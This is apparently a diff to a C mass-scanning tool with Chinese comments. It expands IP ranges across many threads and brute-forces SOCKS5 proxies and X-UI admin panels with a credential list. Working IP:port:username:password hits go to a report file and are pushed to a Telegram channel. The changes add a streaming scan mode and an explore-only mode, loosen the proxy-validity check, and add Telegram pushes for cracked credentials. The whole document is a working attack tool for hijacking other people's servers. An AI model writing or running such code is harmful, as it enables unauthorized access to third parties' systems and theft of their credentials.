@@ -138,8 +138,11 @@ int verify_socks5(const char *ip, uint16_t port, const char *user, const char *p
 
     if (n > 0) {
         http_resp[n] = '\0';
-        // Cloudflare 的 HTTP/1.x 返回常包含 301 Moved 或 HTTP/1.1 301
-        if (strstr(http_resp, "HTTP/1.1 301") || strstr(http_resp, "cloudflare") || strstr(http_resp, "Moved Permanently")) {
+        // 只要收到任何合法 HTTP 响应就认为代理真实有效
+        if (strstr(http_resp, "HTTP/1.1") || strstr(http_resp, "HTTP/1.0") ||
+            strstr(http_resp, "cloudflare") || strstr(http_resp, "Cloudflare") ||
+            strstr(http_resp, "301") || strstr(http_resp, "200") ||
+            strstr(http_resp, "302") || strstr(http_resp, "403")) {
             return 1;
         }
     }
@@ -229,28 +232,52 @@ void *worker_thread(void *arg) {
     }
     socket_close(fd);
     
-        // 端口开放，开始验证
+        // 端口开放，记录发现
+    MUTEX_LOCK(lock_stats);
+    g_state.total_found++;
+    MUTEX_UNLOCK(lock_stats);
+
+    /* scan_mode: 1=探索(只扫描存活), 2=探索+验真, 3=只留极品(只保留验证通过的) */
+    int do_verify = (g_config.scan_mode >= SCAN_EXPLORE_VERIFY);
+
+    /* === 探索模式: 只记录端口开放 === */
+    if (!do_verify) {
+        char result_line[1024];
+        const char *tag = (task->work_mode == MODE_S5) ? "[S5_FOUND]" :
+                          (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) ? "[XUI_FOUND]" :
+                          "[PORT_OPEN]";
+        snprintf(result_line, sizeof(result_line),
+                 "%s %s:%d | 端口开放",
+                 tag, task->ip, task->port);
+        MUTEX_LOCK(lock_file);
+        file_append(g_config.report_file, result_line);
+        file_append(g_config.report_file, "\n");
+        printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
+        MUTEX_UNLOCK(lock_file);
+        goto done;
+    }
+
+    /* === 验真模式 === */
     if (task->work_mode == MODE_S5) {
         for (size_t i = 0; i < task->cred_count; i++) {
             if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
                 found = 1;
                 
                 MUTEX_LOCK(lock_stats);
-                g_state.total_found++;
                 g_state.total_verified++;
                 MUTEX_UNLOCK(lock_stats);
                 
                 // 记录结果
                 char result_line[1024];
                 snprintf(result_line, sizeof(result_line), 
-                         "[S5_VERIFIED] %s:%d %s:%s", 
+                         "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s", 
                          task->ip, task->port, 
                          task->creds[i].username, task->creds[i].password);
                          
                 MUTEX_LOCK(lock_file);
                 file_append(g_config.report_file, result_line);
                 file_append(g_config.report_file, "\n");
-                printf("\n%s\n", result_line); // 实时显示
+                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                 MUTEX_UNLOCK(lock_file);
                 
                 // 推送TG
@@ -268,7 +295,6 @@ void *worker_thread(void *arg) {
             if (verify_xui(task->ip, task->port,
                            task->creds[i].username, task->creds[i].password, 3000)) {
                 MUTEX_LOCK(lock_stats);
-                g_state.total_found++;
                 g_state.total_verified++;
                 MUTEX_UNLOCK(lock_stats);
 
@@ -289,16 +315,16 @@ void *worker_thread(void *arg) {
                          task->ip, task->port, task->creds[i].username, task->creds[i].password);
                 push_telegram(msg);
 
+                found = 1;
                 break;
             }
         }
         /* 深度全能额外跑一遍 S5 */
-        if (task->work_mode == MODE_DEEP) {
+        if (task->work_mode == MODE_DEEP && !found) {
             for (size_t i = 0; i < task->cred_count; i++) {
                 if (verify_socks5(task->ip, task->port,
                                    task->creds[i].username, task->creds[i].password, 3000)) {
                     MUTEX_LOCK(lock_stats);
-                    g_state.total_found++;
                     g_state.total_verified++;
                     MUTEX_UNLOCK(lock_stats);
                     char result_line[1024];
@@ -311,6 +337,11 @@ void *worker_thread(void *arg) {
                     file_append(g_config.report_file, "\n");
                     printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                     MUTEX_UNLOCK(lock_file);
+                    
+                    char msg[1024];
+                    snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>",
+                             task->ip, task->port, task->creds[i].username, task->creds[i].password);
+                    push_telegram(msg);
                     break;
                 }
             }
@@ -324,7 +355,6 @@ void *worker_thread(void *arg) {
                                          task->creds[i].username, task->creds[i].password, 3000);
             if (ok) {
                 MUTEX_LOCK(lock_stats);
-                g_state.total_found++;
                 g_state.total_verified++;
                 MUTEX_UNLOCK(lock_stats);
                 char result_line[1024];
@@ -341,6 +371,8 @@ void *worker_thread(void *arg) {
             }
         }
     }
+
+done:
     
     free(task);
     
@@ -355,7 +387,7 @@ void *worker_thread(void *arg) {
     #endif
 }
 
-// 启动扫描
+// 启动扫描 — 流式展开 IP 段，逐个投喂线程池（对齐 DEJI.py iter_expanded_targets 逻辑）
 void scanner_start_multithreaded(char **nodes, size_t node_count, credential_t *creds, size_t cred_count, uint16_t *ports, size_t port_count) {
     init_locks();
     printf("开始扫描... 总节点: %zu, 总端口: %zu\n", node_count, port_count);
@@ -406,8 +438,8 @@ void scanner_start_multithreaded(char **nodes, size_t node_count, credential_t *
         
         node_idx++;
         
-        // 进度显示 (每 50 个节点刷新一次)
-        if (node_idx % 50 == 0 || node_idx == node_count) {
+        // 进度显示 (每 10 个节点或最后一个刷新一次)
+        if (node_idx % 10 == 0 || node_idx == node_count) {
             MUTEX_LOCK(lock_stats);
             int rt = running_threads;
             uint64_t scanned = g_state.total_scanned;
@@ -431,6 +463,126 @@ void scanner_start_multithreaded(char **nodes, size_t node_count, credential_t *
         saia_sleep(500);
     }
     
+    printf("\n扫描结束\n");
+}
+
+/*
+ * scanner_start_streaming: 流式扫描 — 接受原始未展开的行列表，
+ * 逐行调用 expand_ip_range 展开 IP 段，对每个展开后的 IP 投喂到线程池,
+ * 展开完一行后立即释放该行的展开结果，内存占用极小。
+ * 对应 DEJI.py 的 iter_expanded_targets + asyncio.Queue 机制。
+ */
+void scanner_start_streaming(char **raw_lines, size_t raw_count,
+                             credential_t *creds, size_t cred_count,
+                             uint16_t *ports, size_t port_count) {
+    init_locks();
+
+    /* 第一遍: 估算总目标数 (用于进度显示) */
+    size_t est_total = 0;
+    for (size_t i = 0; i < raw_count; i++) {
+        if (!raw_lines[i] || !*raw_lines[i] || *raw_lines[i] == '#') continue;
+        char **sub = NULL; size_t sub_n = 0;
+        if (expand_ip_range(raw_lines[i], &sub, &sub_n) == 0 && sub) {
+            est_total += sub_n;
+            for (size_t j = 0; j < sub_n; j++) free(sub[j]);
+            free(sub);
+        } else {
+            est_total += 1; /* 无法展开的原样行算一个 */
+        }
+    }
+    printf("开始扫描... 预估目标: %zu, 总端口: %zu\n", est_total, port_count);
+
+    size_t fed_count = 0; /* 已投喂计数 */
+
+    for (size_t li = 0; li < raw_count && g_running; li++) {
+        const char *line = raw_lines[li];
+        if (!line || !*line || *line == '#') continue;
+
+        /* 展开当前行 */
+        char **expanded = NULL;
+        size_t exp_n = 0;
+        if (expand_ip_range(line, &expanded, &exp_n) != 0 || !expanded || exp_n == 0) {
+            /* 展开失败，当作原样单目标 */
+            expanded = (char **)malloc(sizeof(char *));
+            expanded[0] = strdup(line);
+            exp_n = 1;
+        }
+
+        /* 逐个投喂 */
+        for (size_t ei = 0; ei < exp_n && g_running; ei++) {
+            const char *ip = expanded[ei];
+
+            /* 等待线程池有空位 */
+            while (g_running) {
+                if (g_config.backpressure.enabled) {
+                    backpressure_update(&g_config.backpressure);
+                    if (backpressure_should_throttle(&g_config.backpressure)) {
+                        saia_sleep(1000);
+                        continue;
+                    }
+                }
+                MUTEX_LOCK(lock_stats);
+                int cur = running_threads;
+                MUTEX_UNLOCK(lock_stats);
+                if (cur < g_config.threads) break;
+                saia_sleep(50);
+            }
+            if (!g_running) break;
+
+            /* 对当前 IP 的每个端口创建线程 */
+            for (size_t p = 0; p < port_count; p++) {
+                worker_arg_t *arg = (worker_arg_t *)malloc(sizeof(worker_arg_t));
+                strncpy(arg->ip, ip, sizeof(arg->ip) - 1);
+                arg->ip[sizeof(arg->ip) - 1] = '\0';
+                arg->port = ports[p];
+                arg->creds = creds;
+                arg->cred_count = cred_count;
+                arg->work_mode = g_config.mode;
+
+                MUTEX_LOCK(lock_stats);
+                running_threads++;
+                MUTEX_UNLOCK(lock_stats);
+
+                #ifdef _WIN32
+                _beginthreadex(NULL, 0, worker_thread, arg, 0, NULL);
+                #else
+                pthread_t tid;
+                pthread_create(&tid, NULL, worker_thread, arg);
+                pthread_detach(tid);
+                #endif
+            }
+
+            fed_count++;
+            /* 进度显示 */
+            if (fed_count % 100 == 0 || fed_count == est_total) {
+                MUTEX_LOCK(lock_stats);
+                int rt = running_threads;
+                uint64_t scanned = g_state.total_scanned;
+                uint64_t found   = g_state.total_found;
+                MUTEX_UNLOCK(lock_stats);
+                printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
+                       C_CYAN, C_RESET, fed_count, est_total, rt,
+                       (unsigned long long)scanned,
+                       (unsigned long long)found,
+                       C_RESET);
+                fflush(stdout);
+            }
+        }
+
+        /* 释放本行的展开结果 */
+        for (size_t j = 0; j < exp_n; j++) free(expanded[j]);
+        free(expanded);
+    }
+
+    /* 等待剩余线程 */
+    while (1) {
+        MUTEX_LOCK(lock_stats);
+        int remaining = running_threads;
+        MUTEX_UNLOCK(lock_stats);
+        if (remaining <= 0) break;
+        saia_sleep(500);
+    }
+
     printf("\n扫描结束\n");
 }
 
